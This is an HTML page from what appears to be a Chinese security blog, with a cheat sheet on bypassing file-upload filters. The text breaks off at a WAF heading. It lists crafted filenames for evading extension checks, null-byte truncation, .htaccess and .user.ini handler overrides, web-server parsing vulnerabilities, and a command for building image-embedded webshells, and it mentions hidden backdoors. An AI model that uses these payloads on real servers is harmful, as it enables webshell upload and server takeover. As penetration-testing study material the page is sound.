@@ -1,0 +1,466 @@
+<!DOCTYPE html>
+<html itemscope itemtype="http://schema.org/WebPage" lang="en">
+  <head>
+    
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+    <meta name="robots" content="noodp" />
+    <title>文件上传-Bypass - 东隅 Blog</title><meta name="author" content="东隅">
+<meta name="author-link" content="">
+<meta name="description" content="" /><meta name="keywords" content='OWASP, 文件上传' />
+  <meta itemprop="name" content="文件上传-bypass">
+  <meta itemprop="datePublished" content="2024-08-15T09:31:01+08:00">
+  <meta itemprop="dateModified" content="2024-08-15T09:31:01+08:00">
+  <meta itemprop="wordCount" content="404">
+  <meta itemprop="keywords" content="OWASP,文件上传"><meta property="og:url" content="https://dongyu29.github.io/posts/owasp/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/114/">
+  <meta property="og:site_name" content="东隅 Blog">
+  <meta property="og:title" content="文件上传-bypass">
+  <meta property="og:locale" content="en">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2024-08-15T09:31:01+08:00">
+    <meta property="article:modified_time" content="2024-08-15T09:31:01+08:00">
+    <meta property="article:tag" content="OWASP">
+    <meta property="article:tag" content="文件上传">
+
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="文件上传-bypass">
+<meta name="application-name" content="FixIt">
+<meta name="apple-mobile-web-app-title" content="FixIt"><meta name="theme-color" data-light="#f8f8f8" data-dark="#252627" content="#f8f8f8"><meta name="msapplication-TileColor" content="#da532c"><link rel="icon" href="https://raw.githubusercontent.com/dongyu29/dongyu29.github.io/main/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="canonical" href="https://dongyu29.github.io/posts/owasp/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/114/" /><link rel="prev" href="https://dongyu29.github.io/posts/owasp/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/113/" /><link rel="next" href="https://dongyu29.github.io/posts/%E6%94%BB%E9%98%B2/%E9%98%B2%E5%AE%88/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/37/" /><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" href="/lib/fontawesome-free/all.min.css" as="style" onload="this.removeAttribute('onload');this.rel='stylesheet'">
+    <noscript><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"></noscript><link rel="preload" href="/lib/animate/animate.min.css" as="style" onload="this.removeAttribute('onload');this.rel='stylesheet'">
+    <noscript><link rel="stylesheet" href="/lib/animate/animate.min.css"></noscript><script type="application/ld+json">
+  {
+    "@context": "http://schema.org",
+    "@type": "BlogPosting",
+    "headline": "文件上传-bypass",
+    "inLanguage": "en",
+    "mainEntityOfPage": {
+      "@type": "WebPage",
+      "@id": "https:\/\/dongyu29.github.io\/posts\/owasp\/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0\/114\/"
+    },"image": ["https:\/\/raw.githubusercontent.com\/dongyu29\/dongyu29.github.io\/main\/favicon.ico"],"genre": "posts","keywords": "OWASP, 文件上传","wordcount":  404 ,
+    "url": "https:\/\/dongyu29.github.io\/posts\/owasp\/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0\/114\/","datePublished": "2024-08-15T09:31:01+08:00","dateModified": "2024-08-15T09:31:01+08:00","publisher": {
+      "@type": "Organization",
+      "name": "","logo": "https:\/\/raw.githubusercontent.com\/dongyu29\/dongyu29.github.io\/main\/favicon.ico"},"author": {
+        "@type": "Person",
+        "name": "东隅"
+      },"description": ""
+  }
+  </script></head>
+  <body data-header-desktop="sticky" data-header-mobile="auto"><script>(window.localStorage?.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('light' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'light' === 'dark')) && document.body.setAttribute('data-theme', 'dark');</script><div class="wrapper" data-page-style="normal"><header class="desktop animate__faster" id="header-desktop">
+  <div class="header-wrapper">
+    <div class="header-title">
+      <a href="/" title="东隅 Blog"><img loading="lazy" src="https://raw.githubusercontent.com/dongyu29/dongyu29.github.io/main/favicon.ico" alt="东隅 Blog" data-title="东隅 Blog" width="26" height="26" class="logo" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/><span class="header-title-pre"> </span><span class="typeit"><template> 东隅 Blog</template></span></a><span class="header-subtitle"></span></div>
+    <nav>
+      <ul class="menu"><li class="menu-item">
+              <a
+                class="menu-link"
+                href="/posts/"
+                
+                
+              ><i class="fa-solid fa-archive fa-fw fa-sm" aria-hidden="true"></i> Posts</a></li><li class="menu-item">
+              <a
+                class="menu-link"
+                href="/categories/"
+                
+                
+              ><i class="fa-solid fa-th fa-fw fa-sm" aria-hidden="true"></i> Categories</a></li><li class="menu-item">
+              <a
+                class="menu-link"
+                href="/tags/"
+                
+                
+              ><i class="fa-solid fa-tags fa-fw fa-sm" aria-hidden="true"></i> Tags</a></li><li class="menu-item">
+              <a
+                class="menu-link"
+                href="/about/"
+                
+                
+              ><i class="fa-regular fa-id-card fa-fw fa-sm fa-fw fa-sm" aria-hidden="true"></i> About</a></li><li class="menu-item">
+              <a
+                class="menu-link"
+                href="/about/"
+                
+                
+              ></a></li><li class="menu-item delimiter"></li><li class="menu-item theme-switch" title="Switch Theme">
+          <i class="fa-solid fa-adjust fa-fw" aria-hidden="true"></i>
+        </li></ul>
+    </nav>
+  </div>
+</header><header class="mobile animate__faster" id="header-mobile">
+  <div class="header-container">
+    <div class="header-wrapper">
+      <div class="header-title">
+        <a href="/" title="东隅 Blog"><img loading="lazy" src="https://raw.githubusercontent.com/dongyu29/dongyu29.github.io/main/favicon.ico" alt="东隅 Blog" data-title="东隅 Blog" width="26" height="26" class="logo" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/><span class="header-title-pre"> </span><span class="typeit"><template> 东隅 Blog</template></span></a><span class="header-subtitle"></span></div>
+      <div class="menu-toggle" id="menu-toggle-mobile">
+        <span></span><span></span><span></span>
+      </div>
+    </div>
+    <nav>
+      <ul class="menu" id="menu-mobile"><li
+              class="menu-item"
+            ><a
+                  class="menu-link"
+                  href="/posts/"
+                  
+                  
+                ><i class="fa-solid fa-archive fa-fw fa-sm" aria-hidden="true"></i> Posts</a></li><li
+              class="menu-item"
+            ><a
+                  class="menu-link"
+                  href="/categories/"
+                  
+                  
+                ><i class="fa-solid fa-th fa-fw fa-sm" aria-hidden="true"></i> Categories</a></li><li
+              class="menu-item"
+            ><a
+                  class="menu-link"
+                  href="/tags/"
+                  
+                  
+                ><i class="fa-solid fa-tags fa-fw fa-sm" aria-hidden="true"></i> Tags</a></li><li
+              class="menu-item"
+            ><a
+                  class="menu-link"
+                  href="/about/"
+                  
+                  
+                ><i class="fa-regular fa-id-card fa-fw fa-sm fa-fw fa-sm" aria-hidden="true"></i> About</a></li><li
+              class="menu-item"
+            ><a
+                  class="menu-link"
+                  href="/about/"
+                  
+                  
+                ></a></li><li class="menu-item menu-system">
+          <span class="menu-system-item theme-switch" title="Switch Theme"><i class="fa-solid fa-adjust fa-fw" aria-hidden="true"></i></span></li>
+      </ul>
+    </nav>
+  </div>
+</header><nav aria-label="breadcrumb" class="breadcrumb-container sticky">
+    <ol class="breadcrumb"><li class="breadcrumb-item"><a href="/" title="东隅 Blog">Home</a></li><li class="breadcrumb-item"><a href="/posts/" title="Posts">Posts</a></li><li class="breadcrumb-item active" aria-current="page">文件上传-Bypass</li>
+    </ol>
+  </nav><main class="container"><aside class="aside-collection animate__animated animate__fadeIn animate__faster" aria-label="Collections"></aside>
+
+  <article class="page single">
+    <div class="header"><h1 class="single-title animate__animated animate__flipInX"><span title="Repost" class="icon-repost"><i class="fa-solid x" aria-hidden="true"></i></span><span>文件上传-Bypass</span>
+      </h1></div><div class="post-meta">
+      <div class="post-meta-line"><span class="post-author"><span class="author"><img loading="lazy" src="https://raw.githubusercontent.com/dongyu29/dongyu29.github.io/main/favicon.ico" alt="东隅" data-title="东隅" width="20" height="20" class="avatar" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/>&nbsp;东隅</span></span><span class="post-included-in">&nbsp;included in <a href="/categories/owasp/" class="post-category" title="Category - OWASP"><i class="fa-regular fa-folder fa-fw" aria-hidden="true"></i> OWASP</a></span></div><div class="post-meta-line"><span title="published on 2024-08-15 09:31:01"><i class="fa-solid fa-calendar-days fa-fw me-1" aria-hidden="true"></i><time datetime="2024-08-15">2024-08-15</time></span>&nbsp;<span title="404 words"><i class="fa-solid fa-pencil-alt fa-fw me-1" aria-hidden="true"></i>About 500 words</span>&nbsp;<span><i class="fa-regular fa-clock fa-fw me-1" aria-hidden="true"></i>2 minutes</span>&nbsp;</div>
+    </div><div class="details toc" id="toc-static" data-kept="false">
+        <div class="details-summary toc-title">
+          <span>Contents</span>
+          <span><i class="details-icon fa-solid fa-angle-right" aria-hidden="true"></i></span>
+        </div>
+        <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li>
+      <ul>
+        <li></li>
+      </ul>
+    </li>
+  </ul>
+</nav></div>
+      </div><div class="content" id="content" data-end-flag="-----（完）-----"><!-- raw HTML omitted -->
+<p>js前端校验就不说了，前端一般只验证后缀名，抓包改即可</p>
+<p>常见content-type</p>
+<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#a6be9d">1</span><span style="color:#58a1dd">、text开头</span>
+</span></span><span style="display:flex;"><span><span style="color:#58a1dd">text</span><span style="color:#ff636f">/</span><span style="color:#58a1dd">html：</span> <span style="color:#58a1dd">HTML格式</span>
+</span></span><span style="display:flex;"><span><span style="color:#58a1dd">text</span><span style="color:#ff636f">/</span><span style="color:#58a1dd">plain：纯文本格式</span>
+</span></span><span style="display:flex;"><span><span style="color:#58a1dd">text</span><span style="color:#ff636f">/</span><span style="color:#58a1dd">xml：</span> <span style="color:#58a1dd">XML格式</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6be9d">2</span><span style="color:#58a1dd">、图片格式</span>
+</span></span><span style="display:flex;"><span><span style="color:#58a1dd">image</span><span style="color:#ff636f">/</span><span style="color:#58a1dd">gif</span> <span style="color:#58a1dd">：gif</span> <span style="color:#58a1dd">图片格式</span>
+</span></span><span style="display:flex;"><span><span style="color:#58a1dd">image</span><span style="color:#ff636f">/</span><span style="color:#58a1dd">jpeg</span> <span style="color:#58a1dd">：jpg</span> <span style="color:#58a1dd">图片格式</span>
+</span></span><span style="display:flex;"><span><span style="color:#58a1dd">image</span><span style="color:#ff636f">/</span><span style="color:#58a1dd">png：png</span> <span style="color:#58a1dd">图片格式</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6be9d">3</span><span style="color:#58a1dd">、application开头</span>
+</span></span><span style="display:flex;"><span><span style="color:#58a1dd">application</span><span style="color:#ff636f">/</span><span style="color:#58a1dd">xhtml</span><span style="color:#ff636f">+</span><span style="color:#58a1dd">xml：XHTML</span> <span style="color:#58a1dd">格式</span>
+</span></span><span style="display:flex;"><span><span style="color:#58a1dd">application</span><span style="color:#ff636f">/</span><span style="color:#58a1dd">xml：XML</span> <span style="color:#58a1dd">数据格式</span>
+</span></span><span style="display:flex;"><span><span style="color:#58a1dd">application</span><span style="color:#ff636f">/</span><span style="color:#58a1dd">atom</span><span style="color:#ff636f">+</span><span style="color:#58a1dd">xml：Atom</span> <span style="color:#58a1dd">XML</span> <span style="color:#58a1dd">聚合格式</span>
+</span></span><span style="display:flex;"><span><span style="color:#58a1dd">application</span><span style="color:#ff636f">/</span><span style="color:#58a1dd">json：JSON</span> <span style="color:#58a1dd">数据格式</span>
+</span></span><span style="display:flex;"><span><span style="color:#58a1dd">application</span><span style="color:#ff636f">/</span><span style="color:#58a1dd">pdf：pdf</span> <span style="color:#58a1dd">格式</span>
+</span></span><span style="display:flex;"><span><span style="color:#58a1dd">application</span><span style="color:#ff636f">/</span><span style="color:#58a1dd">msword：Word</span> <span style="color:#58a1dd">文档格式</span>
+</span></span><span style="display:flex;"><span><span style="color:#58a1dd">application</span><span style="color:#ff636f">/</span><span style="color:#58a1dd">octet</span><span style="color:#ff636f">-</span><span style="color:#58a1dd">stream：二进制流数据（如常见的文件下载）</span>
+</span></span><span style="display:flex;"><span><span style="color:#58a1dd">application</span><span style="color:#ff636f">/</span><span style="color:#58a1dd">x</span><span style="color:#ff636f">-</span><span style="color:#58a1dd">www</span><span style="color:#ff636f">-</span><span style="color:#58a1dd">form</span><span style="color:#ff636f">-</span><span style="color:#58a1dd">urlencoded：表单发送默认格式</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6be9d">4</span><span style="color:#58a1dd">、媒体文件</span>
+</span></span><span style="display:flex;"><span><span style="color:#58a1dd">audio</span><span style="color:#ff636f">/</span><span style="color:#58a1dd">x</span><span style="color:#ff636f">-</span><span style="color:#58a1dd">wav：wav文件</span>
+</span></span><span style="display:flex;"><span><span style="color:#58a1dd">audio</span><span style="color:#ff636f">/</span><span style="color:#58a1dd">x</span><span style="color:#ff636f">-</span><span style="color:#58a1dd">ms</span><span style="color:#ff636f">-</span><span style="color:#58a1dd">wma：w文件</span>
+</span></span><span style="display:flex;"><span><span style="color:#58a1dd">audio</span><span style="color:#ff636f">/</span><span style="color:#58a1dd">mp3：mp3文件</span>
+</span></span><span style="display:flex;"><span><span style="color:#58a1dd">video</span><span style="color:#ff636f">/</span><span style="color:#58a1dd">x</span><span style="color:#ff636f">-</span><span style="color:#58a1dd">ms</span><span style="color:#ff636f">-</span><span style="color:#58a1dd">wmv：wmv文件</span>
+</span></span><span style="display:flex;"><span><span style="color:#58a1dd">video</span><span style="color:#ff636f">/</span><span style="color:#58a1dd">mpeg4：mp4文件</span>
+</span></span><span style="display:flex;"><span><span style="color:#58a1dd">video</span><span style="color:#ff636f">/</span><span style="color:#58a1dd">avi：avi文件</span></span></span></code></pre></div><h5 id="后缀校验" class="heading-element"><span>0.0.0.1  后缀校验</span>
+  <a href="#%e5%90%8e%e7%bc%80%e6%a0%a1%e9%aa%8c" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h5><h6 id="黑名单" class="heading-element"><span>0.0.0.1.1  黑名单</span>
+  <a href="#%e9%bb%91%e5%90%8d%e5%8d%95" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h6><p>####### 可解析后缀</p>
+<p><img loading="lazy" src="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202402211342451.webp" alt="image-20240221134159852" srcset="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202402211342451.webp?size=small, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202402211342451.webp?size=medium 1.5x, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202402211342451.webp?size=large 2x" data-title="image-20240221134159852" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
+<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#58a1dd">php</span><span style="color:#ff636f">:</span>  <span style="color:#58a1dd">Php</span><span style="color:#ff636f">|</span><span style="color:#58a1dd">php2</span><span style="color:#ff636f">|</span><span style="color:#58a1dd">php3</span><span style="color:#ff636f">|</span><span style="color:#58a1dd">php4</span><span style="color:#ff636f">|</span><span style="color:#58a1dd">php5</span><span style="color:#ff636f">|</span><span style="color:#58a1dd">php6</span><span style="color:#ff636f">|</span><span style="color:#58a1dd">php7</span><span style="color:#ff636f">|</span><span style="color:#58a1dd">pht</span><span style="color:#ff636f">|</span><span style="color:#58a1dd">phtm</span><span style="color:#ff636f">|</span><span style="color:#58a1dd">phtml</span>
+</span></span><span style="display:flex;"><span><span style="color:#58a1dd">asp</span><span style="color:#ff636f">:</span>  <span style="color:#58a1dd">asp、aspx、asa、asax、ascx、ashx、asmx、cer</span>
+</span></span><span style="display:flex;"><span><span style="color:#58a1dd">jsp</span><span style="color:#ff636f">:</span>  <span style="color:#58a1dd">jsp、jspa、jspx、jsw、jsv、jspf、jhtml</span></span></span></code></pre></div><p>fuzz工具：https://github.com/c0ny1/upload-fuzz-dic-builder</p>
+<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#58a1dd">python2</span> <span style="color:#58a1dd">upload</span><span style="color:#ff636f">-</span><span style="color:#58a1dd">fuzz</span><span style="color:#ff636f">-</span><span style="color:#58a1dd">dic</span><span style="color:#ff636f">-</span><span style="color:#58a1dd">builder</span><span style="color:#ff636f">.</span><span style="color:#58a1dd">py</span> <span style="color:#ff636f">-</span><span style="color:#58a1dd">n</span> <span style="color:#58a1dd">test</span> <span style="color:#ff636f">-</span><span style="color:#58a1dd">a</span> <span style="color:#58a1dd">jpg</span> <span style="color:#ff636f">-</span><span style="color:#58a1dd">l</span> <span style="color:#58a1dd">php</span> <span style="color:#ff636f">-</span><span style="color:#58a1dd">m</span> <span style="color:#58a1dd">apache</span> <span style="color:#ff636f">--</span><span style="color:#58a1dd">os</span> <span style="color:#58a1dd">win</span> <span style="color:#ff636f">-</span><span style="color:#58a1dd">o</span> <span style="color:#58a1dd">upload_file</span><span style="color:#ff636f">.</span><span style="color:#58a1dd">txt</span></span></span></code></pre></div><!-- raw HTML omitted -->
+<p>####### 利用系统特性</p>
+<p>貌似主要是windows,常见的：1、大小写 2、点绕过（<code>.</code> 或者 <code>.空格.</code>） 3、空格绕过  4、::$DATA绕过</p>
+<p>Windows 下文件名结尾加入<code>&lt;</code>、<code>&gt;</code>、<code>&gt;&gt;&gt;</code>、<code>_</code>、<code>0x81-0xff</code>等字符，最终生成的文件均被 windows 忽略。</p>
+<pre tabindex="0"><code>shell.pHp
+shell.php. 
+shell.php. .
+shell.php_
+shell.php空格 
+shell.php:1.jpg 
+shell. php::$DATA </code></pre><p>php</p>
+<pre tabindex="0"><code>后缀名：.php3 ,.php5,.php7
+大小写：pHp
+解析漏洞：
+1.php.jpg
+1.jpg.php
+1.php  jpg(jpg前面两个空格)
+1.php jpg(jpg前面一个空格)
+/1.jpg/1.php
+/1.jpg%00.php
+/1.jpg/.php
+/1.jpg/php</code></pre><p>jsp</p>
+<pre tabindex="0"><code>.jsp.jpg.jsp-用两个jsp包围中间的jpg
+后缀名：jspf,jspa,jsps</code></pre><p>asp</p>
+<pre tabindex="0"><code>解析漏洞:
+.asp;.jpg
+.asp.jpg
+.asp;jpg
++111.asp;+222.jpg
+/111.asp/1.jpg
+/111.aspx/1.jpg
+后缀名：
+asa,cer,cdx,ashx,asmx,xml,htr,asax
+双文件扩展：
+test.asp.jpg
+RTLO：
+asp.html-内容为一句话
+php.txt-内容为一句话</code></pre><h6 id="白名单" class="heading-element"><span>0.0.0.1.2  白名单</span>
+  <a href="#%e7%99%bd%e5%90%8d%e5%8d%95" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h6><p>####### 截断</p>
+<p>截断原理:由于00代表结束符,所以会把00后面的所有字符都截断</p>
+<p>截断条件:PHP版本小于5.3.4,PHP的magic_quotes_gpc为OFF状态</p>
+<pre tabindex="0"><code>1.直接加%00 如 1.php%00
+2.二进制x00  去bp16进制里改00</code></pre><p>####### 解析漏洞</p>
+<blockquote>
+<p><strong>一、重写解析规则</strong></p>
+</blockquote>
+<p><a href="https://www.freebuf.com/articles/web/287193.html"target="_blank" rel="external nofollow noopener noreferrer">浅析.htaccess和.user.ini文件上传</a></p>
+<p>==.htaccess==</p>
+<p>.htaccess的配置文件只能在Apache服务器中起作用</p>
+<pre tabindex="0"><code>&lt;FiileMatch &#34;.jpg&#34;&gt;
+SetHandler application/x-httpd-php
+AddHandler php5-script .jpg
+&lt;/FiileMatch&gt;</code></pre><p>==.user.ini==</p>
+<p><code>条件</code></p>
+<ul>
+<li>服务器脚本语言为PHP 服务器使用CGI</li>
+<li>FastCGI模式</li>
+<li>上传目录下要有可执行的php文件</li>
+</ul>
+<p>是php里ini文件的一种，和php.ini不同，他是可以动态加载的，无需重启中间件即可生效</p>
+<pre tabindex="0"><code>auto_prepend_file=1.gif    # 要访问的文件加载之前加载，
+或者
+auto_append_file=1.gif # 要访问的文件加载之后加载</code></pre><p>上传一个包含webshell代码的1.gif：</p>
+<p>访问本目录下任意文件就可以实现命令执行</p>
+<p><strong>虽然.user.ini也有限制条件，但是相比.htaccess的用于更加广泛，不仅适用于Apache，还可以在Nginx上操作。
+除此之外，还可以利用.user.ini进行<code>隐藏后门</code>，在php目录下留下图片马。</strong></p>
+<blockquote>
+<p><strong>二、中间件解析漏洞</strong></p>
+</blockquote>
+<pre tabindex="0"><code>IIS
+一共有三个解析漏洞：
+1. IIS 6.0 文件解析 xx.asp;.jpg
+2. IIS 6.0 目录解析 xx.asp/1.jpg(xx.asp命名的文件夹里的文件都将会被当成ASP文件执行)
+3. IIS 7.5 畸形解析 xxx.jpg/x.php(传一个jpg，后面写/x.php这种目录，会把jpg当php解析)
+
+Apahce
+1. %0a (CVE-2017-15715)
+2. 未知后缀 test.php.xxx
+3.test.php.a.b  (apache解析文件的规则是从右到左开始判断解析，如果后缀名为不可识别文件解析，就再往左判断)
+
+后缀不识别：1.php.php123
+配置错误：1.php.jpg
+
+nginx
+解析漏洞有三个：
+1. 访问链接加 /xxx.php，即 test.jpg/xxx.php
+2. 畸形解析漏洞 test.jpg%00xxx.php
+3. CVE-2013-4547 test.jpg(非编码空格)\0x.php
+
+tomcat
+用于上传绕过的有三种，部分限制在 windows 操作系统下。
+1. xxx.jsp/
+2. xxx.jsp%20
+3. xxx.jsp::$DATA</code></pre><p>####### 包含</p>
+<p>传个图片然后包含</p>
+<h5 id="内容" class="heading-element"><span>0.0.0.2  内容</span>
+  <a href="#%e5%86%85%e5%ae%b9" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h5><h6 id="文件头" class="heading-element"><span>0.0.0.2.1  文件头</span>
+  <a href="#%e6%96%87%e4%bb%b6%e5%a4%b4" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h6><p>文件内容带上二进制文件头</p>
+<pre tabindex="0"><code> GIF：47 49 46 38 39 61 
+ png：89 50 4E 47 0D 0A 1A 0A 
+ JPG：FF D8 FF E0 00 10 4A 46 49 46</code></pre><h6 id="图片马" class="heading-element"><span>0.0.0.2.2  图片马</span>
+  <a href="#%e5%9b%be%e7%89%87%e9%a9%ac" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h6><p>如果用getimagesize、php_exif判断上传图片类型，直接传图片马就可以绕过</p>
+<p>一般解析图片马需要结合<code>解析漏洞</code>或者<code>文件包含</code>才能解析图片马</p>
+<pre tabindex="0"><code>copy a.png /b + a.php /a 3.php  
+/b:指定以二进制格式复制、合并文件，用于图像或者声音类文件
+/a:指定以ascii格式复制、合并文件用于txt等文本类文件</code></pre><h6 id="waf" class="heading-element"><span>0.0.0.2.3  WAF</span>
+  <a href="#waf" class="heading-mark">
